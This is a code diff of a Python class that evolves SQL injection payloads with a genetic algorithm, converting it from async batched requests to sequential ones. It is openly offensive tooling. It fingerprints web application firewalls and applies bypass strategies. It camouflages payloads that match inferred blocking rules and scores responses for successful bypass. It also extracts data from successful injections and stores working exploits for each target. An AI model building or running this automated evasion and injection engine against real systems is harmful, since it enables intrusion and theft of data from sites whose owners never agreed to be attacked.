@@ -157,13 +157,13 @@ class IslandManager:
         union = len(s1.union(s2))
         return intersection / union if union > 0 else 0
 
-    async def evolve_generation(self, gen_num):
+    def evolve_generation(self, gen_num):
         global_max_score = 0
         
         # 0. Poll for AI Hints from SQLite
         hints = self.exp_manager.get_latest_hint()
         if hints:
-            self.client.log(f"[*] AI HINT RECEIVED: {hints.get('suggestion', 'N/A')}")
+            print(f"[*] AI HINT RECEIVED: {hints.get('suggestion', 'N/A')}", flush=True)
             for island in self.islands:
                 island["mutator"].apply_hint(hints)
 
@@ -176,7 +176,7 @@ class IslandManager:
             else:
                 mutator.epsilon = 0.2
                 
-            island_results = await self._evolve_island(island, gen_num)
+            island_results = self._evolve_island(island, gen_num)
             if island_results["max_score"] > global_max_score:
                 global_max_score = island_results["max_score"]
             
@@ -189,22 +189,22 @@ class IslandManager:
 
         # 1.5 Batch WAF Pattern Analysis (Understanding 'Why')
         if self.blocked_buffer:
-            self.client.log(f"[*] Analyzing WAF behavior across {len(self.blocked_buffer)} blocked payloads...")
+            print(f"[*] Analyzing WAF behavior across {len(self.blocked_buffer)} blocked payloads...", flush=True)
             new_inferred_rules = self.inferrer.analyze_batch(self.blocked_buffer)
             if new_inferred_rules:
-                self.client.log(f"[WAF_ANALYSIS_SUCCESS] Inferred {len(new_inferred_rules)} blocking patterns.", type="success")
+                print(f"[WAF_ANALYSIS_SUCCESS] Inferred {len(new_inferred_rules)} blocking patterns.", flush=True)
                 for island in self.islands:
                     island["mutator"].inferred_rules = new_inferred_rules
                     
                 for rule in new_inferred_rules[:3]: # Log top 3
-                    self.client.log(f"  [PATTERN_ID] Rule: '{rule['pattern']}' | Confidence: {rule['confidence']:.2f}")
+                    print(f"  [PATTERN_ID] Rule: '{rule['pattern']}' | Confidence: {rule['confidence']:.2f}", flush=True)
             
             # Clear buffer for next gen
             self.blocked_buffer = []
 
         # 2. Migration Step: Every 5 generations, exchange genetic material
         if gen_num > 0 and gen_num % 5 == 0:
-            await self._migrate()
+            self._migrate()
 
         self.best_score_history.append(global_max_score)
         
@@ -241,7 +241,7 @@ class IslandManager:
 
         return self.hall_of_fame[-1] if self.hall_of_fame else None
 
-    async def _evolve_island(self, island, gen_num):
+    def _evolve_island(self, island, gen_num):
         pop = island["population"] # List of PayloadGenome objects
         mutator = island["mutator"]
         scored_population = []
@@ -259,84 +259,118 @@ class IslandManager:
         mutation_intensity = min(max(1, round(calc_intensity)), 6)
 
         if mutation_intensity >= 3:
-            self.client.log(f"  [!] Island {island['id']} Chaos: Intensity {mutation_intensity} | Diversity: {diversity_ratio:.2f}")
+            print(f"  [!] Island {island['id']} Chaos: Intensity {mutation_intensity} | Diversity: {diversity_ratio:.2f}", flush=True)
 
-        # Prepare Payloads (including predictive blocking and camouflage)
-        ready_to_test = []
         for i, genome in enumerate(pop):
             payload_str = genome.render()
-            if payload_str in self.hall_of_fame or payload_str in self.session_tested:
-                continue
+            if payload_str in self.hall_of_fame: continue
             
+            # 0. Avoid repeating successful payloads in the same session
+            if payload_str in self.session_tested:
+                continue
+
+            # 1. Predictive Blocking (The Intelligent Filter)
+            # If severely stagnated, ignore predictive blocker occasionally to force exploration against real WAF
             ignore_blocker = (island["stagnation"] >= 5 and random.random() < 0.3)
+            
             if not ignore_blocker:
                 risk_score, matched_patterns = self.blocker.should_block(payload_str)
                 if risk_score > 0:
+                    print(f"  [Island {island['id']}] {i+1}/{len(pop)}: [RISKY] {risk_score} patterns detected. Applying Active Camouflage...", flush=True)
+                    # Point 5: Instead of avoiding, we increase camouflage
                     payload_str = mutator.camouflage_payload(payload_str, matched_patterns)
-            
-            ready_to_test.append((genome, payload_str))
+                    # We might want to re-validate if it's still "too" risky, or just send it
+                    # Here we just proceed with the camouflaged version
 
-        # Batch Processing
-        batch_size = 4 # Process 4 concurrent requests per island
-        for i in range(0, len(ready_to_test), batch_size):
-            batch = ready_to_test[i:i + batch_size]
-            tasks = []
-            for genome, p_str in batch:
-                self.client.log(f"  [Island {island['id']}] Testing {p_str[:40]}...", type="attack")
-                tasks.append(self.client.send_request(p_str))
+            print(f"  [Island {island['id']}] {i+1}/{len(pop)}: Requesting... {payload_str[:30]}", flush=True)
+            try:
+                response = self.client.send_request(payload_str)
+            except Exception as e:
+                print(f"  [Island {island['id']}] Request FAILED: {e}", flush=True)
+                continue
             
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
+            print(f"  [Island {island['id']}] Response received (Status: {response['status']})", flush=True)
             
-            for (genome, p_str), response in zip(batch, responses):
-                if isinstance(response, Exception):
-                    self.client.log({"type": "error", "message": f"[Island {island['id']}] Request FAILED: {str(response)}"})
-                    continue
-                
-                # Check Fingerprint (on first success or if unknown)
-                waf = self.fingerprinter.identify(response.get('headers', {}), response.get('text', ''))
+            # 1.1 WAF Fingerprinting (First Request of the generation or if unknown)
+            if i == 0:
+                waf = self.fingerprinter.identify(response['headers'], response['text'])
                 if waf != "GENERIC / UNKNOWN":
-                    mutator.apply_hint({"suggestion": self.fingerprinter.get_bypass_strategy(waf)["hint"], "weights": self.fingerprinter.get_bypass_strategy(waf)["weights"]})
+                    print(f"[*] WAF DETECTED: {waf}", flush=True)
+                    strategy = self.fingerprinter.get_bypass_strategy(waf)
+                    mutator.apply_hint({"suggestion": strategy["hint"], "weights": strategy["weights"]})
 
-                # Validate & Score
-                state_vec = self.validator.get_state_vector(response['text'], response['status'], response.get('latency', 0), self.baseline, depth=genome.depth, consecutive_fails=island['stagnation'])
-                score, status = self.validator.validate(response['text'], response['status'], payload=p_str, latency=response.get('latency', 0), baseline=self.baseline)
-                
-                latency = response.get('latency', 0)
-                if latency > 3000 and status == "INCONCLUSIVE": score += 0.1
-                
-                if score <= 0.1:
-                    self.blocker.learn_from_block(p_str)
-                    self.blocked_buffer.append(p_str)
-                    if self.semantic_memory: self.semantic_memory.learn_blocked_pattern(p_str)
-                elif score >= 0.8:
-                    self.blocker.report_success(p_str)
+            # Point 6: Generate State Vector (Now 11 dimensions)
+            state_vec = self.validator.get_state_vector(
+                response['text'], 
+                response['status'], 
+                response.get('latency', 0), 
+                self.baseline,
+                depth=genome.depth,
+                consecutive_fails=island['stagnation']
+            )
+            
+            score, status = self.validator.validate(response['text'], response['status'], payload=payload_str, latency=response.get('latency', 0), baseline=self.baseline)
+            
+            # Point 4: Side-Channel Reward (Latency Penalty/Reward)
+            # If latency is very high but it's a 200, maybe it's Deep Inspection (WAF stress).
+            latency = response.get('latency', 0)
+            if latency > 3000 and status == "INCONCLUSIVE":
+                score += 0.1 # Information gain from side-channel
+            
+            # 1.2 Combat Genetic Drift
+            if status == "WAF_BYPASSED_PARTIAL" and any("WAF_BYPASSED_PARTIAL" in n for n in self.discovered_niches):
+                score *= 0.5 
+                status = "LOCAL_OPTIMA_PENALIZED"
 
-                error_msg = self.validator.get_sql_error(response['text'])
-                block_reason = self.inferrer.get_blocking_reason(p_str) if score <= 0.1 else None
-                
-                self.client.log({
-                    "type": "attempt",
-                    "island": island['id'],
-                    "payload": p_str,
-                    "score": score,
-                    "status": status,
-                    "latency": latency,
-                    "gen": gen_num
-                })
-                
-                mutator.report_success(p_str, score, status=status, state_vector=state_vec, block_reason=block_reason)
-                self.exp_manager.save_attempt(p_str, score, status, island_id=island['id'], generation_num=gen_num, error_msg=error_msg, target_name=self.target_name, parent_payload=genome.parent_payload)
-                scored_population.append((genome, score, error_msg))
-                
-                if score > max_score: max_score = score
+            if score <= 0.1:
+                self.blocker.learn_from_block(payload_str)
+                self.blocked_buffer.append(payload_str)
+                if self.semantic_memory:
+                    self.semantic_memory.learn_blocked_pattern(payload_str)
+            elif score >= 0.8:
+                self.blocker.report_success(payload_str)
+
+            # 3. SQL Error Refinement (Implicitly handled by AST mutations in next gen)
+            error_msg = self.validator.get_sql_error(response['text'])
+            
+            # Similarity Penalty
+            for successful_p in self.hall_of_fame:
+                if self._calculate_similarity(payload_str, successful_p) > 0.8:
+                    score *= 0.5
+                    status = f"BIASED_{status}"
+                    break
+
+            # 3.5 Identify Blocking Reason (Understanding 'Why')
+            # Check if this specific block matches any of our inferred rules
+            block_reason = None
+            if score <= 0.1:
+                block_reason = self.inferrer.get_blocking_reason(payload_str)
+                if block_reason:
+                    print(f"  [WAF_REASON] Payload matched inferred rule: '{block_reason[0]['pattern']}'", flush=True)
+
+            print(f"  [{status} | {score*100:.1f}] ... {payload_str[:20]}... {island['id']}:{i+1}/{len(pop)} [{island['id']} Island]", flush=True)
+            
+            self.session_tested.add(payload_str)
+            # Pass advanced metrics to RL reporter
+            mutator.report_success(payload_str, score, status=status, state_vector=state_vec, block_reason=block_reason)
+            self.exp_manager.save_attempt(payload_str, score, status, island_id=island['id'], generation_num=gen_num, error_msg=error_msg, target_name=self.target_name, parent_payload=genome.parent_payload)
+            scored_population.append((genome, score, error_msg))
+            
+            if score > max_score: max_score = score
+            
+            # Track discoveries
+            if score >= 0.3:
+                self.discovered_niches.add(f"{status}_{payload_str}")
                 if score >= 0.7:
+                    # 4. Data Extraction Report (New: Harvesting actual data from success)
                     harvested_data = self.extractor.extract(response['text'])
-                    if harvested_data: self.client.log(self.extractor.format_report(harvested_data), type="success")
-                    if p_str not in self.hall_of_fame:
-                        self.hall_of_fame.append(p_str)
-                        self.exp_manager.save_exploit(p_str, status, target_name=self.target_name)
-                
-                self.session_tested.add(p_str)
+                    if harvested_data:
+                        report = self.extractor.format_report(harvested_data)
+                        print(report, flush=True)
+
+                    if payload_str not in self.hall_of_fame:
+                        self.hall_of_fame.append(payload_str)
+                        self.exp_manager.save_exploit(payload_str, status, target_name=self.target_name)
 
         # Next Gen for this island
         scored_population.sort(key=lambda x: x[1], reverse=True)
@@ -345,29 +379,15 @@ class IslandManager:
         
         # Inject learned WAF rules into Mutator for active evasion during generation
         mutator.active_waf_rules = self.blocker.blocked_patterns
-        island["population"] = await self._generate_next_gen(elites, survivors, mutation_intensity, mutator)
-
-        # Telemetry Data
-        telemetry = {
-            "type": "telemetry",
-            "gen": gen_num,
-            "island": island["id"],
-            "max_score": max_score,
-            "diversity": diversity_ratio,
-            "intensity": mutation_intensity,
-            "stagnation": island["stagnation"]
-        }
-        self.client.log(telemetry)
-        self.exp_manager.save_telemetry(gen_num, island["id"], max_score, diversity_ratio, mutation_intensity, island["stagnation"])
-
+        island["population"] = self._generate_next_gen(elites, survivors, mutation_intensity, mutator)
         return {"max_score": max_score, "diversity": diversity_ratio}
 
-    async def _migrate(self):
+    def _migrate(self):
         """
         Point 5: Federated Policy Migration.
         Exchanges both genetic material (payloads) and learned weights (Policy).
         """
-        self.client.log("[*] Migration Event: Exchanging genetic policy across islands...")
+        print("[*] Migration Event: Exchanging payloads AND learned policy weights between islands...", flush=True)
         for i in range(self.num_islands):
             source_island = self.islands[i]
             target_island = self.islands[(i + 1) % self.num_islands]
@@ -385,12 +405,13 @@ class IslandManager:
         self.semantic_memory.sync_to_db()
         self.semantic_memory._load_memory() # Refresh from DB to get patterns from all islands
 
-    async def _generate_next_gen(self, elites, survivors, intensity, mutator):
+    def _generate_next_gen(self, elites, survivors, intensity, mutator):
         next_gen = []
         seen_payloads = set()
         
         # Elites stay as they are
         for e in elites:
+            # e is a PayloadGenome object
             payload_str = e.render()
             if payload_str not in seen_payloads:
                 next_gen.append(e)
@@ -406,10 +427,11 @@ class IslandManager:
             rand_val = random.random()
             
             if rand_val < 0.15: # Diversity: Semantic Seed from Memory
+                # Try to get a semantically similar payload from history for the best current survivor
                 semantic_seed_str = None
                 if survivors:
                     best_survivor_genome = survivors[0][0]
-                    results = await self.client.semantic_search(best_survivor_genome.render(), k=3)
+                    results = self.client.semantic_search(best_survivor_genome.render(), k=3)
                     if results:
                         semantic_seed_str = random.choice(results).get('content')
                 
